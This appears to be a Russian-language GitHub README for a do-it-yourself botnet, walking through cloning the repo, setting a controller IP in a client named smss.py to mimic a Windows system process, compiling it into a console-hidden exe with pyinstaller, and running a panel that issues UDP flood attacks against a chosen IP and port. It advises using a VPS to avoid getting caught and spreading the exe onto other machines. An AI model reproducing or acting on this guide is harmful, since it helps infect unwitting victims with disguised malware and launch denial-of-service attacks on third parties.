<h1 align="center">Подпишись на мой телеграмм <a href="https://t.me/samurai_figure" target="_blank">N∆RI</a> 
<img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
<h3 align="center">Простой бот-нет своими руками ot N∆RI</h3>
Можно также использовать как панель для VPS ботнета <br>
Лучше всего проверить работоспособность на себе ,а потом заливать куда-то<br>
Клонируем гит <br>
 
```shell
git clone https://github.com/Samuraianonweb/bot
```
<br>
 
```shell
cd fuck_you_ru
```
<br>
Чтобы не попасться , лучше использовать VPS<br>

Чтобы узнать (Свой/VPS) ip <br>
```
ifconfig
```
Редактируем файл smss.py вставляем свой ip чтобы всё "боты" могли подключиться к вашей панели<br>

```python
run=False
	def __init__(self, connect:Tuple[str,int]=("вставляем свой ip",9999)) -> None:
```
Почему smss? -Підсистема диспетчера сеансів, або smss.exe, є компонентом сімейства операційних систем Microsoft
Когда всё подготовленно , осталось зделать с Python  в EXe файл<br>

Установка pyinstaller<br>
 
```shell
pip install pyinstaller
```

После полной установки pyinstaller в нашем директории fuck_you_ru <br>
Приступаем к билду exe <br>
 
```shell
pyinstaller --onefile --noconsole smss.py
```
<br>
Флаг --onefile собирает всё в один файл<br>
Флаг --noconsole делает так чтобы при запуске скрывалась консоль <br>
После того как наш файл exe создался можно начать с панели <br>

Инфо (Ваши боты в тайне будут каждые 10 секунду проверять подключение к панели)
```
Error connecting ('ip', 9999)| Sleep 10 seconds
```
Запус панели ботнета<br>
```shell
python Server.py
```
Вводим help и видем всё настройки 
update - Для обновления листа ботов 
list - Показать активных ботов 
Команда атаки<br>
 
```shell
attack udp <ip> <port> <time in second> <thread>
```
